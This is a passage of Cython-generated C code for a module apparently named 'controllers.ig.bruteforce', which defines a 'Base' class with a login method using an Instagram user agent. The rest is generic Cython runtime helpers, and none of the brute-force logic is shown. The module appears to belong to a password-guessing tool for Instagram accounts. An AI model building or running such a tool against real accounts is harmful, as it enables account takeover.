  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_11login, 0, __pyx_n_s_Base_login, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__31)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (!__Pyx_CyFunction_InitDefaults(__pyx_t_1, sizeof(__pyx_defaults), 1)) __PYX_ERR(0, 294, __pyx_L1_error)

   
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_app); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_IG_USER_AGENT); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_CyFunction_Defaults(__pyx_defaults, __pyx_t_1)->__pyx_arg_user_agent = __pyx_t_8;
  __Pyx_GIVEREF(__pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_CyFunction_SetDefaultsGetter(__pyx_t_1, __pyx_pf_11controllers_2ig_10bruteforce_8__init_____defaults__);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_login, __pyx_t_1) < 0) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_Base, __pyx_empty_tuple, __pyx_t_2, NULL, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Base, __pyx_t_1) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init controllers.ig.bruteforce.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init controllers.ig.bruteforce.__init__");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

 
 
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

 
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

 
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

 
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

 
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

 
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

 
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

 
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
     
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
             
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

 
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
     
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

 
static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname) {
    PyErr_Format(PyExc_NameError, "free variable '%s' referenced before assignment in enclosing scope", varname);
}

 
static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatSimpleAndDecref(PyObject* s, PyObject* f) {
    if (unlikely(!s)) return NULL;
    if (likely(PyUnicode_CheckExact(s))) return s;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyString_CheckExact(s))) {
        PyObject *result = PyUnicode_FromEncodedObject(s, NULL, "strict");
        Py_DECREF(s);
        return result;
    }
    #endif
    return __Pyx_PyObject_FormatAndDecref(s, f);
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatAndDecref(PyObject* s, PyObject* f) {
    PyObject *result = PyObject_Format(s, f);
    Py_DECREF(s);
    return result;
}

 
static const char DIGIT_PAIRS_10[2*10*10+1] = {
    "00010203040506070809"
    "10111213141516171819"
    "20212223242526272829"
    "30313233343536373839"
    "40414243444546474849"
    "50515253545556575859"
    "60616263646566676869"
    "70717273747576777879"
    "80818283848586878889"
    "90919293949596979899"
};
static const char DIGIT_PAIRS_8[2*8*8+1] = {
    "0001020304050607"
    "1011121314151617"
    "2021222324252627"
    "3031323334353637"
    "4041424344454647"
    "5051525354555657"
    "6061626364656667"
    "7071727374757677"
};
static const char DIGITS_HEX[2*16+1] = {
    "0123456789abcdef"
    "0123456789ABCDEF"
};

 
static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char) {
    PyObject *uval;
    Py_ssize_t uoffset = ulength - clength;
#if CYTHON_USE_UNICODE_INTERNALS
    Py_ssize_t i;
#if CYTHON_PEP393_ENABLED
    void *udata;
    uval = PyUnicode_New(ulength, 127);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_DATA(uval);
#else
    Py_UNICODE *udata;
    uval = PyUnicode_FromUnicode(NULL, ulength);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_AS_UNICODE(uval);
#endif
    if (uoffset > 0) {
        i = 0;
        if (prepend_sign) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, 0, '-');
            i++;
        }
        for (; i < uoffset; i++) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, i, padding_char);
        }
    }
    for (i=0; i < clength; i++) {
        __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, uoffset+i, chars[i]);
    }
#else
    {
        PyObject *sign = NULL, *padding = NULL;
        uval = NULL;
        if (uoffset > 0) {
            prepend_sign = !!prepend_sign;
            if (uoffset > prepend_sign) {
                padding = PyUnicode_FromOrdinal(padding_char);
                if (likely(padding) && uoffset > prepend_sign + 1) {
                    PyObject *tmp;
                    PyObject *repeat = PyInt_FromSsize_t(uoffset - prepend_sign);
                    if (unlikely(!repeat)) goto done_or_error;
                    tmp = PyNumber_Multiply(padding, repeat);
                    Py_DECREF(repeat);
                    Py_DECREF(padding);
                    padding = tmp;
                }
                if (unlikely(!padding)) goto done_or_error;
            }
            if (prepend_sign) {
                sign = PyUnicode_FromOrdinal('-');
                if (unlikely(!sign)) goto done_or_error;
            }
        }
        uval = PyUnicode_DecodeASCII(chars, clength, NULL);
        if (likely(uval) && padding) {
            PyObject *tmp = PyNumber_Add(padding, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
        if (likely(uval) && sign) {
            PyObject *tmp = PyNumber_Add(sign, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
done_or_error:
        Py_XDECREF(padding);
        Py_XDECREF(sign);
    }
#endif
    return uval;
}

 
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char) {
    char digits[sizeof(Py_ssize_t)*3+2];
    char *dpos, *end = digits + sizeof(Py_ssize_t)*3+2;
    const char *hex_digits = DIGITS_HEX;
    Py_ssize_t length, ulength;
    int prepend_sign, last_one_off;
    Py_ssize_t remaining;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const Py_ssize_t neg_one = (Py_ssize_t) -1, const_zero = (Py_ssize_t) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (format_char == 'X') {
        hex_digits += 16;
        format_char = 'x';
    }
    remaining = value;
    last_one_off = 0;
    dpos = end;
    do {
        int digit_pos;
        switch (format_char) {
        case 'o':
            digit_pos = abs((int)(remaining % (8*8)));
            remaining = (Py_ssize_t) (remaining / (8*8));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_8 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 8);
            break;
        case 'd':
            digit_pos = abs((int)(remaining % (10*10)));
            remaining = (Py_ssize_t) (remaining / (10*10));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_10 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 10);
            break;
        case 'x':
            *(--dpos) = hex_digits[abs((int)(remaining % 16))];
            remaining = (Py_ssize_t) (remaining / 16);
            break;
        default:
            assert(0);
            break;
        }
    } while (unlikely(remaining != 0));
    if (last_one_off) {
        assert(*dpos == '0');
        dpos++;
    }
    length = end - dpos;
    ulength = length;
    prepend_sign = 0;
    if (!is_unsigned && value <= neg_one) {
        if (padding_char == ' ' || width <= length + 1) {
            *(--dpos) = '-';
            ++length;
        } else {
            prepend_sign = 1;
        }
        ++ulength;
    }
    if (width > ulength) {
        ulength = width;
    }
    if (ulength == 1) {
        return PyUnicode_FromOrdinal(*dpos);
    }
    return __Pyx_PyUnicode_BuildFromAscii(ulength, dpos, (int) length, prepend_sign, padding_char);
}

 
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

 
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

 
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

 
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

 
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

 
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
